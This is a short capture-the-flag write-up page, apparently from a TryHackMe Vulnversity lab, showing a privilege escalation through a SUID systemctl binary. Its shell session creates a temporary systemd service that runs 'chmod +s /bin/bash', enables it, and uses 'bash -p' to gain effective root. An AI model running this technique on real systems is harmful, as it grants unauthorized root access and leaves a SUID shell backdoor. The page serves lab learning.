---
layout: default
title: Systemctl
parent: SUID
nav_order: 7
---

# Systemctl

---

## Exploit /bin/systemctl

Checking GTFObins we have a path to privesc by exploiting _/bin/systemctl_

![systemctl](../../../../assets/images/ctfs/try_hack_me/vulnversity/systemctl.png)

We can exploit in the following manner by giving effective root privileges to _/bin/bash_

```bash
www-data@vulnuniversity:/tmp$ TF=$(mktemp).service
www-data@vulnuniversity:/tmp$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/tmp$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.o6GKXSAfpc.service to /tmp/tmp.o6GKXSAfpc.service.
www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.o6GKXSAfpc.service to /tmp/tmp.o6GKXSAfpc.service.
www-data@vulnuniversity:/tmp$ bash -p
bash-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-4.3#

```
